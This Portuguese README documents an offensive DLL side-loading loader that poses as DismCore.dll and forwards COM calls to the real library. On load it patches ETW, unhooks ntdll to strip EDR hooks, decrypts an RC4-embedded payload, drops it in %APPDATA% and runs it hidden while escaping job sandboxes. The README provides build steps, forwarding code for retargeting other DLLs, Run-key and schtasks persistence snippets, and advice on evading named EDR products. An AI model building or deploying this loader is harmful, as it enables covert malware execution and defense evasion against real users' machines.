
<div align="center">

**Proxy DLL COM com payload embutido, extração em runtime e execução side-loading.**

Encaminha os quatro exports COM para a DLL real (`DismCore_real.dll`) enquanto
instala, extrai e executa um payload RC4-ofuscado a partir de `%APPDATA%`.

![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?logo=windows&logoColor=white)
![toolchain](https://img.shields.io/badge/toolchain-MSVC%20%2F%20VS%202019--2022-5C2D91?logo=visualstudio&logoColor=white)
![language](https://img.shields.io/badge/C%2B%2B-17-00599C?logo=cplusplus&logoColor=white)
![python](https://img.shields.io/badge/python-3.8%2B-3776AB?logo=python&logoColor=white)
![license](https://img.shields.io/badge/license-MIT-green)

</div>

---

## Índice

- [Visão geral](#visão-geral)
- [Componentes](#componentes)
- [Pré-requisitos](#pré-requisitos)
- [Fluxo de build](#fluxo-de-build)
- [Entendendo o sideload](#entendendo-o-sideload)
- [Como trocar o alvo do proxy](#como-trocar-o-alvo-do-proxy)
  - [Caso A — alvo COM com os mesmos 4 exports](#caso-a--alvo-com-com-os-mesmos-4-exports)
  - [Caso B — alvo com exports diferentes](#caso-b--alvo-com-exports-diferentes)
- [Como trocar o payload](#como-trocar-o-payload)
- [Como regerar as chaves por build](#como-regerar-as-chaves-por-build)
- [Camadas de evasão](#camadas-de-evasão)
- [Notas operacionais](#notas-operacionais)
- [Estrutura de arquivos](#estrutura-de-arquivos)
- [Licença](#licença)

---

## Visão geral

```text
                     ┌──────────────────────────────────────────┐
   EXE hospedeiro ──▶│ DismCore.dll  (proxy, este projeto)      │
   (LoadLibrary)     │  ├─ PatchETW()      → EtwEventWrite =ret │
                     │  ├─ UnhookNtdll()   → .text restaurado   │
                     │  ├─ extract_payload → %APPDATA%\...      │
                     │  ├─ CreateProcessW  → payload -fullinstall│
                     │  └─ forwarding COM → DismCore_real.dll   │
                     └──────────────────────────────────────────┘
                                      │
                                      ▼
                     ┌──────────────────────────────────────────┐
                     │ DismCore_real.dll (DLL original)         │
                     │  Carregada do DLL search path            │
                     └──────────────────────────────────────────┘
```

O projeto produz uma única DLL (`DismCore.dll`) que:

1. **Substitui** a DLL legítima homônima em um diretório onde o EXE hospedeiro a
   carrega via search order (`LoadLibrary` sem caminho absoluto).
2. Ao ser carregada, **antes** de qualquer chamada COM:
   - Faz patch em `ntdll!EtwEventWrite` para `ret` (`0xC3`) — telemetria ETW do
     processo morre.
   - Restaura a seção `.text` de `ntdll.dll` a partir do mapeamento em disco —
     remove hooks user-mode instalados por EDR.
   - Extrai o payload embutido como recurso RC4, decripta em memória, valida a
     assinatura `MZ` e grava em `%APPDATA%\Microsoft\Windows\Service.exe`.
   - Executa o payload via `CreateProcessW` com janela oculta, em job separado
     (`CREATE_BREAKAWAY_FROM_JOB`).
3. **Encaminha** os quatro exports COM padrão para a DLL real
   (`DismCore_real.dll`), mantendo a interface esperada pelo hospedeiro.

Todas as strings sensíveis — caminho, nome do payload, argumentos, nome da DLL
real — ficam ofuscadas em **UTF-16LE com XOR par/ímpar** em `OBF_STRINGS.h`. O
payload em si é **RC4-encrypted** em `payload.bin`, embutido como recurso RCDATA
pelo `payload.rc`.

---

## Componentes

| Arquivo | Função |
| :--- | :--- |
| `sideload.cpp` | DLL proxy. Contém `DllMain`, patches de evasão, extrator de payload e os stubs COM. |
| `proxy.def` | Lista de exports do linker. Define **quais** símbolos a DLL exporta. |
| `payload.rc` | Embute `payload.bin` como recurso RCDATA (ID 1, tipo 10). |
| `payload.bin` | Payload RC4-encrypted, gerado por `obfuscate.py`. |
| `OBF_STRINGS.h` | Header gerado com `STR_KEY` + arrays UTF-16LE ofuscados. |
| `obfuscate.py` | Gera `OBF_STRINGS.h`, encripta `Service.exe` → `payload.bin`, imprime `RC4_KEY`. |
| `build.bat` | Localiza VS via `vswhere`, compila `.rc`, compila `sideload.cpp` → `DismCore.dll`. |

---

## Pré-requisitos

| Requisito | Detalhe |
| :--- | :--- |
| **Sistema** | Windows 10/11 (o build é feito no host; o alvo é o mesmo). |
| **Visual Studio** | 2019 ou 2022, com workload *Desktop development with C++* e o componente `Microsoft.VisualStudio.Component.VC.Tools.x86.x64`. |
| **Windows SDK** | Para `rc.exe` — incluído com o VS se o workload acima estiver instalado. |
| **Python** | 3.8+ (apenas stdlib, sem dependências). |
| **Payload** | Um `Service.exe` na pasta raiz para ser embutido. |

---

## Fluxo de build

Ordem de execução, **uma vez por build**:

### 1. Preparar o payload

Colocar `Service.exe` na pasta raiz — é o binário que será embutido.

### 2. Editar a string table

Ajustar `obfuscate.py` se necessário:

```python
strings = {
    "S_PATH": "\\Microsoft\\Windows",   # subdir sob %APPDATA%
    "S_NAME": "Service.exe",            # nome do payload dropado
    "S_ARGS": "-fullinstall",           # argumentos do payload
    "S_REAL": "DismCore_real.dll",      # DLL real para forwarding COM
}
```

### 3. Rodar o gerador

```powershell
python obfuscate.py
```

Saída esperada:

```text
[+] RC4_KEY = 0x47,0xB6,0x9A,0x5A,0x6F,0x71,0xCA,0x2C,0x03,0x9E,0x40,0xBB,0x10,0x17,0x97,0x2B
[+] OBF_STRINGS.h gerado
[+] payload.bin regravado (N bytes)
```

Gera `OBF_STRINGS.h` e `payload.bin`.

### 4. Colar a `RC4_KEY`

Inserir a chave impressa dentro de `sideload.cpp`:

```cpp
static const unsigned char RC4_KEY[] = { 0x47,0xB6,0x9A,0x5A, /* ... */ };
static const size_t RC4_KEY_LEN = sizeof(RC4_KEY);
```

> [!IMPORTANT]
> Essa etapa é **obrigatória**. A chave em `sideload.cpp` precisa bater com a
> chave usada em `payload.bin`, ou a verificação `MZ` falha e o payload não é
> extraído.

### 5. Rodar o build

```bat
build.bat
```

Saída: `DismCore.dll`.

O `build.bat`:

- Encontra o VS com `vswhere`.
- Compila `payload.rc` → `payload.res`.
- Compila `sideload.cpp` com `/LD` (DLL), `/O2` (otimização), `/GS-` (sem stack
  canary), `/MT` (CRT estático), `/std:c++17`, `/EHsc`.
- Linka com `/DEF:proxy.def` e as libs `kernel32 user32 shell32 advapi32`.
- Nome final da DLL é `DismCore.dll` (variável `DLLNAME` no topo do script).

---

## Entendendo o sideload

O host carrega `DismCore.dll` via `LoadLibraryW(L"DismCore.dll")` — **sem
caminho**. O Windows resolve na ordem de search (`SafeDllSearchMode` on por
padrão):

```text
1. Diretório do EXE
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Diretório atual
6. PATH
```

Basta colocar o `DismCore.dll` fake **no diretório do EXE hospedeiro** e ele é
carregado no lugar do original. A DLL real continua acessível — basta copiá-la
para o mesmo diretório com outro nome (`DismCore_real.dll`) ou apontar `S_REAL`
para um caminho absoluto.

---

## Como trocar o alvo do proxy

Trocar `DismCore` por outro alvo é trocar três coisas: **nome do arquivo de
saída**, **nome da DLL real** e **lista de exports em `proxy.def`**. A
complexidade depende de o novo alvo ter a mesma forma do atual (COM com os 4
exports padrão) ou uma forma diferente.

### Caso A — alvo COM com os mesmos 4 exports

Funciona para DLLs que exportam exatamente:

```text
DllCanUnloadNow
DllGetClassObject
DllRegisterServer
DllUnregisterServer
```

Exemplos: `DismCore.dll`, `OneCoreCommonProxyStub.dll`, várias DLLs COM de
componentes do Windows.

**Passos:**

1. **`build.bat`** — trocar o nome da saída:

   ```bat
   set "DLLNAME=NovoAlvo.dll"
   ```

2. **`obfuscate.py`** — trocar a string da DLL real:

   ```python
   "S_REAL": "NovoAlvo_real.dll",
   ```

3. **`proxy.def`** — trocar o nome da biblioteca (o bloco `EXPORTS` fica igual,
   os 4 nomes de export são os mesmos):

   ```def
   LIBRARY NovoAlvo
   EXPORTS
       DllCanUnloadNow
       DllGetClassObject
       DllRegisterServer
       DllUnregisterServer
   ```

4. Regenerar `OBF_STRINGS.h` (`python obfuscate.py`), colar o novo `RC4_KEY` em
   `sideload.cpp`, rodar `build.bat`.

Nada mais muda. O `sideload.cpp` já tem os 4 stubs COM hardcoded.

### Caso B — alvo com exports diferentes

Se o novo alvo **não** for uma DLL COM com os 4 exports padrão, você precisa
reescrever a lista de exports **e** os stubs de forwarding.

Exemplo: trocar para `version.dll` (17 exports, nenhum COM).

<details>
<summary><b>Passo 1 — descobrir os exports do alvo</b></summary>

No host, com `dumpbin` (vem no VS):

```bat
dumpbin /exports C:\Windows\System32\version.dll
```

Saída (resumida):

```text
ordinal hint RVA      name
      1    0 00002A10 GetFileVersionInfoA
      2    1 00002A80 GetFileVersionInfoByHandle
      3    2 00002B00 GetFileVersionInfoExA
      ...
     17   16 00003B40 VerQueryValueW
```

</details>

<details>
<summary><b>Passo 2 — reescrever <code>proxy.def</code></b></summary>

```def
LIBRARY version
EXPORTS
    GetFileVersionInfoA
    GetFileVersionInfoByHandle
    GetFileVersionInfoExA
    GetFileVersionInfoExW
    GetFileVersionInfoSizeA
    GetFileVersionInfoSizeExA
    GetFileVersionInfoSizeExW
    GetFileVersionInfoSizeW
    GetFileVersionInfoW
    VerFindFileA
    VerFindFileW
    VerInstallFileA
    VerInstallFileW
    VerLanguageNameA
    VerLanguageNameW
    VerQueryValueA
    VerQueryValueW
```

</details>

<details>
<summary><b>Passo 3 — reescrever os stubs em <code>sideload.cpp</code></b></summary>

Apague os quatro `STDAPI` e substitua por stubs genéricos. Como `version.dll`
exporta funções de assinaturas diversas, o caminho limpo é um **macro de
forwarding** com `LoadLibrary` + `GetProcAddress` na primeira chamada:

```cpp
// language: C++, file: sideload.cpp (fragmento — substitui os STDAPI antigos)
// *carrega a DLL real uma vez, encaminha cada export para o símbolo homônimo*

static HMODULE RealDll() {
    static HMODULE h = nullptr;
    if (!h) {
        std::wstring n = dec(S_REAL, sizeof(S_REAL));
        h = LoadLibraryW(n.c_str());
    }
    return h;
}

#define FWD(ret, name, params, args) \
    extern "C" __declspec(dllexport) ret __stdcall name params { \
        typedef ret (__stdcall *fn_t) params; \
        HMODULE h = RealDll(); \
        if (!h) return ret{}; \
        fn_t fn = (fn_t)GetProcAddress(h, #name); \
        return fn ? fn args : ret{}; \
    }

// Ajuste assinaturas conforme o header real da version.dll
FWD(BOOL,  GetFileVersionInfoA,     (LPCSTR a,  DWORD b, DWORD c, LPVOID d), (a,b,c,d))
FWD(BOOL,  GetFileVersionInfoW,     (LPCWSTR a, DWORD b, DWORD c, LPVOID d), (a,b,c,d))
FWD(DWORD, GetFileVersionInfoSizeA, (LPCSTR a,  LPDWORD b),                  (a,b))
FWD(DWORD, GetFileVersionInfoSizeW, (LPCWSTR a, LPDWORD b),                  (a,b))
// ... repetir para os 17 exports
```

> [!NOTE]
> **Por que não usar forwarders do linker** (`EXPORTS Name=Real.Name`)?
> Porque o linker precisa resolver `Real.Name` no momento do link — o que exige
> uma `.lib` de importação para a DLL real. Como aqui a DLL real é carregada em
> runtime (renomeada, em path arbitrário), o padrão é o stub manual com
> `GetProcAddress`.

</details>

<details>
<summary><b>Passo 4 — DllMain não muda</b></summary>

Os patches de ETW/ntdll, a extração e a execução do payload são independentes do
alvo do proxy.

</details>

<details>
<summary><b>Passo 5 — ajustar <code>S_REAL</code> para apontar ao real</b></summary>

Se o alvo for uma DLL de sistema (`version.dll` em `System32`), o mais seguro é
usar caminho absoluto, para não recarregar o próprio proxy por engano:

```python
"S_REAL": "C:\\Windows\\System32\\version.dll",
```

> [!WARNING]
> Sem caminho absoluto, `LoadLibraryW(L"version.dll")` reencontra a DLL fake no
> diretório do EXE (search order) e entra em **loop de auto-carregamento**.

</details>

**Passo 6** — regenerar, colar `RC4_KEY`, buildar.

#### Resumo — o que muda em cada caso

| Item | Caso A (COM) | Caso B (outro) |
| :--- | :--- | :--- |
| `build.bat` → `DLLNAME` | troca | troca |
| `obfuscate.py` → `S_REAL` | troca | troca (idealmente path absoluto) |
| `proxy.def` → `LIBRARY` | troca | troca |
| `proxy.def` → `EXPORTS` | inalterado (4 COM) | reescrito (todos os exports do alvo) |
| `sideload.cpp` → stubs | inalterado | reescrito |
| `sideload.cpp` → `DllMain` | inalterado | inalterado |

---

## Como trocar o payload

O payload é qualquer PE de 64 bits com assinatura `MZ`. Para trocá-lo:

1. Sobrescreva `Service.exe` na raiz com o novo binário.
2. Rode `python obfuscate.py` — isso regera `payload.bin` com RC4 nova.
3. Cole o novo `RC4_KEY` em `sideload.cpp`.
4. Ajuste `S_NAME` e `S_ARGS` em `obfuscate.py` se o nome ou argumentos do
   payload mudarem.
5. Rode `build.bat`.

O `payload.rc` **não precisa mudar** — ele referencia `payload.bin` por nome:

```rc
1 RCDATA "payload.bin"
```

---

## Como regerar as chaves por build

Duas chaves independentes, ambas por build:

| Chave | Onde nasce | Onde vive no binário | Regenerada por |
| :--- | :--- | :--- | :--- |
| `STR_KEY` (XOR par/ímpar para strings) | `obfuscate.py`, `random.randint` | `OBF_STRINGS.h` | cada execução de `obfuscate.py` |
| `RC4_KEY` (cifra do payload) | `obfuscate.py`, `random.randint` | `sideload.cpp` (colada à mão) | cada execução de `obfuscate.py` |

**Fluxo ideal:** rodar `obfuscate.py` como parte do script de build e extrair o
`RC4_KEY` automaticamente (via `sed`/PowerShell ou `#include` de um header
gerado), eliminando a etapa manual.

<details>
<summary><b>Melhoria sugerida — <code>RC4_KEY</code> gerada no header</b></summary>

Mover `RC4_KEY` para `OBF_STRINGS.h`, gerado pelo Python, e `#include` no
`sideload.cpp`. Elimina a colagem manual e mantém as duas chaves sincronizadas
por construção:

```python
# em obfuscate.py, dentro do bloco de escrita do OBF_STRINGS.h:
f.write("static const unsigned char RC4_KEY[] = {" +
        ",".join(f"0x{b:02X}" for b in RC4_KEY) + "};\n")
f.write(f"static const size_t RC4_KEY_LEN = {len(RC4_KEY)};\n\n")
```

Em `sideload.cpp`, remover o array hardcoded — o header passa a fornecer.

</details>

---

## Camadas de evasão

| Camada | O que faz | O que cobre | O que **não** cobre |
| :--- | :--- | :--- | :--- |
| **XOR par/ímpar em strings** | Ofusca `S_PATH`, `S_NAME`, `S_ARGS`, `S_REAL` em UTF-16LE — só bytes pares XORed | Assinaturas estáticas em `.rdata` | Análise dinâmica; strings decriptadas em memória |
| **RC4 do payload** | Payload embutido cifrado com chave nova por build | AV estático no recurso RCDATA | EDR comportamental após execução |
| **ETW patch** | `ntdll!EtwEventWrite` → `ret` | Telemetria ETW *do processo atual* | Eventos kernel-side; ETW de outros processos |
| **ntdll unhook** | `.text` de `ntdll.dll` remapeada do disco | Hooks user-mode de EDR em `ntdll` | Hooks kernel-mode; reinjeção de hooks por EDR ativo |
| **`/MT`** | CRT estático, sem `vcruntime140.dll` | Detecção por dependência de CRT | — |
| **`/GS-`** | Sem stack canary | Assinatura de binário "compilado com VS default" | — |
| **`CREATE_BREAKAWAY_FROM_JOB`** | Escapa de job objects (sandboxes de AV, Chrome, Office) | Sandbox por job | Sandbox por virtualização (WDAG, HVCI) |
| **`SW_HIDE` + `CREATE_NEW_CONSOLE`** | Payload sem janela visível | Percepção do usuário | Lista de processos |

---

## Notas operacionais

### Persistência

O código **não** instala persistência explícita. O payload executado recebe
`-fullinstall` — se ele mesmo se instala como serviço, o vetor é o payload.

Para persistência no proxy (não no payload), adicione ao final de `DllMain`:

```cpp
// HKCU\Software\Microsoft\Windows\CurrentVersion\Run
RegSetValueExW(hKey, L"DismCore", 0, REG_SZ, (BYTE*)exePath.c_str(),
               (DWORD)((exePath.size() + 1) * sizeof(wchar_t)));
```

ou uma tarefa agendada via:

```bat
schtasks /create /sc onlogon /tn "DismCore" /tr "%APPDATA%\Microsoft\Windows\Service.exe"
```

### Limpeza

O proxy **não** se remove. O payload fica em
`%APPDATA%\Microsoft\Windows\Service.exe` persistente entre sessões. Um build de
limpeza seria:

```cpp
DeleteFileW(exePath.c_str());
RemoveDirectoryW(base.c_str());
```

executado após `WaitForSingleObject`, opcionalmente atrás de uma flag compilada.

### Superfície de detecção

EDRs modernos detectam este padrão por:

1. **DLL não-assinada em diretório de EXE assinado** — regra comportamental
   padrão. *Mitigação:* assinar o proxy com certificado válido, ou abusar de
   proxy assinado legítimo como alvo.
2. **Modificação de `.text` de `ntdll.dll`** — algumas EDRs fazem scan de
   integridade periódico. *Mitigação:* restaurar hooks após a execução do
   payload, ou usar syscalls indiretas em vez de unhook.
3. **Modificação de `EtwEventWrite`** — ETW tamper detection roda em kernel mode
   em produtos como CrowdStrike e Defender for Endpoint. *Mitigação:* patch após
   todas as chamadas sensíveis, ou evitar ETW patch e usar syscalls diretas.
4. **Cadeia `%APPDATA%\...\Service.exe -fullinstall` com `SW_HIDE`** — o par
   (path de usuário + flag de instalação + janela oculta) é heurística conhecida.
   *Mitigação:* usar path de sistema, serviço legítimo como alvo, ou injeção em
   processo existente em vez de `CreateProcessW`.

---

## Estrutura de arquivos

```text
.
├── obfuscate.py          # gerador de strings + RC4 do payload
├── build.bat             # pipeline de compilação
├── sideload.cpp          # DLL proxy
├── proxy.def             # exports do linker
├── payload.rc            # recurso RCDATA
├── payload.bin           # (gerado) payload RC4-encrypted
├── OBF_STRINGS.h         # (gerado) strings ofuscadas + STR_KEY
├── Service.exe           # payload bruto (entrada)
└── DismCore.dll          # (gerado) saída final
```

Arquivos gerados (`payload.bin`, `OBF_STRINGS.h`, `DismCore.dll`, `*.obj`,
`*.res`, `*.exp`, `*.lib`) devem constar em `.gitignore`:

```gitignore
# build artifacts
*.obj
*.res
*.exp
*.lib
*.dll
*.exe

# generated
payload.bin
OBF_STRINGS.h
```

---

## Licença

Distribuído sob a licença **MIT**. Veja [`LICENSE`](LICENSE) para o texto
completo.

<div align="center">

---

Feito para pesquisa de segurança ofensiva e estudo de técnicas de side-loading.

</div>